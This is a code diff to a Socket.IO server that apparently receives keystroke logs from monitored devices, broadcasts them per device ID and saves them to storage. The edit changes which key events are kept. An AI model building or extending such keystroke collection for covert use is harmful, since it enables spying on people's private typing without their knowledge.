@@ -590,7 +590,11 @@ export const startSocketIO = async () => {
 						const keyEvent = response.event;
 
 						// Check if keylogs is not an empty string before proceeding
-						if (keylogs && keylogs.trim() !== "") {
+						if (
+							keyEvent == "Text Input" &&
+							keylogs &&
+							keylogs.trim() !== "[]"
+						) {
 							io.emit(
 								`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
 								{
@@ -603,10 +607,10 @@ export const startSocketIO = async () => {
 							);
 
 							// Data should be include deviceId and keylogs
+							await addNewKeyLogs(response);
 						} else {
 							console.log("Empty key logs, skipping...");
 						}
-						await addNewKeyLogs(response);
 					} catch (error) {
 						console.log("Key Logs Response Error", error);
 					}
